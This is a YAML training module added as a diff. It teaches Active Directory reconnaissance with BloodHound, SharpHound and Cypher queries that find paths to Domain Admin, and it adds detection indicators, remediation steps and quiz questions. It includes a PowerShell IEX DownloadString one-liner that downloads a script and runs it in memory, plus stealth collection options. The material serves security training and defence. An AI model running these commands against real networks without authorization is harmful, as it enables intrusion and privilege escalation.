@@ -1,0 +1,204 @@
+# Category: Active Directory - Enumeration
+name: "Active Directory Enumeration with BloodHound"
+id: "ad-bloodhound-001"
+category: "active_directory"
+subcategory: "enumeration"
+difficulty: "intermediate"
+estimated_time: "60 minutes"
+
+description: |
+  Collect and analyze Active Directory data using BloodHound and SharpHound to
+  identify attack paths, privilege escalation routes, and domain dominance
+  opportunities. Map relationships between users, groups, computers, and GPOs.
+
+learning_objectives:
+  - Collect AD data using SharpHound and BloodHound.py
+  - Import and analyze data in the BloodHound GUI
+  - Execute pre-built queries to find attack paths
+  - Write custom Cypher queries for specific scenarios
+
+tools:
+  - bloodhound
+  - sharphound
+  - bloodhound_python
+  - neo4j
+  - cypher
+
+prerequisites:
+  - Valid domain user credentials
+  - Network access to domain controller (TCP 389, TCP 445)
+  - BloodHound and Neo4j installed on analysis machine
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Setup BloodHound and Neo4j on analysis machine"
+    commands:
+      - "# Install Neo4j"
+      - "apt-get install -y neo4j"
+      - "systemctl start neo4j"
+      - "# Change default Neo4j password"
+      - "neo4j-admin dbms set-initial-password [neo4j_password]"
+      - "# Download BloodHound"
+      - "wget https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip"
+      - "unzip BloodHound-linux-x64.zip"
+      - "chmod +x BloodHound-linux-x64/BloodHound"
+      - "# Launch BloodHound"
+      - "./BloodHound-linux-x64/BloodHound --no-sandbox &"
+    expected_output: "BloodHound GUI running and connected to Neo4j database"
+    detection: "N/A — setup on attacker machine"
+
+  - id: "step2"
+    phase: "reconnaissance"
+    action: "Collect AD data from Linux using BloodHound.py"
+    commands:
+      - "pip3 install bloodhound"
+      - "# Collect all data types"
+      - "bloodhound-python -u [username] -p [password] -d [domain] -ns [dc_ip] -c all"
+      - "# Collect with specific methods"
+      - "bloodhound-python -u [username] -p [password] -d [domain] -ns [dc_ip] -c DCOnly"
+      - "bloodhound-python -u [username] -p [password] -d [domain] -ns [dc_ip] -c Session,LocalAdmin,ACL"
+      - "# Using Kerberos authentication"
+      - "bloodhound-python -u [username] -p [password] -d [domain] -ns [dc_ip] -c all --auth-method kerberos"
+      - "# Output to specific directory"
+      - "bloodhound-python -u [username] -p [password] -d [domain] -ns [dc_ip] -c all --zip -o /tmp/bloodhound_data"
+      - "ls /tmp/bloodhound_data/*.zip"
+    expected_output: "JSON/ZIP files containing users, groups, computers, sessions, ACLs, GPOs"
+    detection: "LDAP enumeration traffic; Event ID 4662 for ACL reads; SMB session enumeration"
+
+  - id: "step3"
+    phase: "reconnaissance"
+    action: "Collect AD data from Windows using SharpHound"
+    commands:
+      - "# Download SharpHound"
+      - "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1')"
+      - "# Collect all data"
+      - "Invoke-BloodHound -CollectionMethod All -ZipFileName /temp/bloodhound.zip"
+      - "# Stealth collection (less noisy)"
+      - "Invoke-BloodHound -CollectionMethod DCOnly"
+      - "# SharpHound.exe"
+      - "SharpHound.exe -c All --zipfilename bloodhound_data.zip"
+      - "SharpHound.exe -c Session,LocalAdmin --stealth"
+      - "# Loop collection for session data"
+      - "SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --LoopInterval 00:05:00"
+    expected_output: "ZIP file with BloodHound JSON data ready for import"
+    detection: "SharpHound process execution (EventID 4688); LDAP queries from non-DC source"
+
+  - id: "step4"
+    phase: "enumeration"
+    action: "Import data and run pre-built BloodHound queries"
+    commands:
+      - "# Import data via BloodHound GUI: Upload Data button"
+      - "# Or via REST API"
+      - "curl -X POST http://localhost:7474/db/neo4j/tx/commit -H 'Content-Type: application/json' -u neo4j:[neo4j_password] -d '{...}'"
+      - "# Pre-built queries to run in BloodHound GUI:"
+      - "# Analysis > Find all Domain Admins"
+      - "# Analysis > Find Shortest Paths to Domain Admins"
+      - "# Analysis > Find Principals with DCSync Rights"
+      - "# Analysis > Find Computers where Domain Users are Local Admin"
+      - "# Analysis > Find AS-REP Roastable Users"
+      - "# Analysis > Find Kerberoastable Users"
+      - "# Analysis > Find Shortest Path from Owned Principals"
+      - "# Analysis > Find Computers with Unsupported Operating Systems"
+    expected_output: "Visual attack path graph from current user to Domain Admin"
+    detection: "N/A — local analysis"
+
+  - id: "step5"
+    phase: "enumeration"
+    action: "Custom Cypher queries for specific attack scenarios"
+    commands:
+      - "# Find users with DCSync rights"
+      - "MATCH p=()-[:DCSync|AllExtendedRights|GenericAll]->(:Domain) RETURN p"
+      - "# Find paths from owned users to Domain Admin"
+      - "MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@[DOMAIN]'})) RETURN p"
+      - "# Find all kerberoastable users with admin rights"
+      - "MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group) WHERE g.name =~ '(?i).*admin.*' RETURN u.name, g.name"
+      - "# Find computers where low-priv user is local admin"
+      - "MATCH p=(u:User {name:'[USERNAME]@[DOMAIN]'})-[:MemberOf*0..]->(g:Group)-[:AdminTo]->(c:Computer) RETURN p"
+      - "# Find AS-REP Roastable users"
+      - "MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.admincount"
+      - "# Find GPO that applies to high-value targets"
+      - "MATCH p=(g:GPO)-[:GpLink]->(ou:OU)-[:Contains*1..]->(c:Computer {highvalue:true}) RETURN p"
+      - "# Find users with GenericWrite on other users (shadow credentials, etc.)"
+      - "MATCH p=(u:User)-[:GenericWrite]->(v:User) RETURN p"
+    expected_output: "Cypher query results showing specific attack paths and opportunities"
+    detection: "N/A — local Neo4j queries"
+
+  - id: "step6"
+    phase: "enumeration"
+    action: "BloodHound CE (Community Edition) and PlumHound reporting"
+    commands:
+      - "# Install BloodHound CE via Docker"
+      - "git clone https://github.com/SpecterOps/BloodHound.git /opt/BloodHoundCE"
+      - "cd /opt/BloodHoundCE && docker compose up -d"
+      - "# PlumHound automated reporting"
+      - "pip3 install plumhound"
+      - "PlumHound.py -x tasks/default.tasks -p [neo4j_password]"
+      - "PlumHound.py --HistoricalRisk -p [neo4j_password] -o /tmp/plumhound_report"
+      - "# Export attack paths to HTML report"
+      - "PlumHound.py -x tasks/fullreport.tasks -p [neo4j_password] -o /tmp/bhreport"
+    expected_output: "HTML report with all attack paths, risks, and recommendations"
+    detection: "N/A — local analysis"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1087.002"
+    description: "Account Discovery: Domain Account"
+  - standard: "MITRE ATT&CK"
+    control: "T1069.002"
+    description: "Permission Groups Discovery: Domain Groups"
+  - standard: "NIST 800-53 Rev5"
+    control: "AC-6"
+    description: "Least privilege — identify excessive permissions"
+  - standard: "CIS Controls v8"
+    control: "5.4"
+    description: "Restrict administrator privileges"
+
+detection:
+  network_indicators:
+    - "Large volume of LDAP queries to domain controller from non-DC source"
+    - "SMB connections to all domain computers for local admin enumeration"
+    - "SAMR/LSARPC calls for group membership enumeration"
+  log_indicators:
+    - "Event ID 4662: Object operations on AD objects (ACL reads)"
+    - "Event ID 4624: Multiple logons from SharpHound collection host"
+    - "LDAP query patterns consistent with BloodHound collection"
+    - "Windows Defender ATP: BloodHound collection behavior detected"
+  endpoint_indicators:
+    - "SharpHound.exe or SharpHound.ps1 execution"
+    - "bloodhound-python process on Linux assessment host"
+
+remediation:
+  immediate:
+    - "Review and remove excessive ACL permissions identified by BloodHound"
+    - "Clean up stale admin accounts and group memberships"
+    - "Remove unnecessary Service Principal Names (SPNs)"
+  long_term:
+    - "Run BloodHound quarterly to track AD security posture"
+    - "Implement AD tiering model to eliminate escalation paths"
+    - "Deploy Purple Knight or PingCastle for continuous AD assessment"
+    - "Remove all GenericAll/GenericWrite ACEs from non-admin principals"
+
+variables:
+  domain: "corp.example.com"
+  dc_ip: "192.168.1.10"
+  username: "jsmith"
+  password: "Password123"
+  neo4j_password: "BloodHound123"
+
+assessment_questions:
+  - "What data does the SharpHound 'All' collection method gather?"
+  - "How do you find the shortest attack path to Domain Admin in BloodHound?"
+  - "What Cypher query finds users with DCSync rights?"
+  - "Why is session data collection more detectable than DCOnly collection?"
+  - "What is the difference between BloodHound CE and the original BloodHound?"
+
+references:
+  - url: "https://github.com/BloodHoundAD/BloodHound"
+    title: "BloodHound GitHub"
+  - url: "https://github.com/fox-it/BloodHound.py"
+    title: "BloodHound.py"
+  - url: "https://github.com/PlumHound/PlumHound"
+    title: "PlumHound Reporting"
+  - url: "https://bloodhound.readthedocs.io/"
+    title: "BloodHound Documentation"
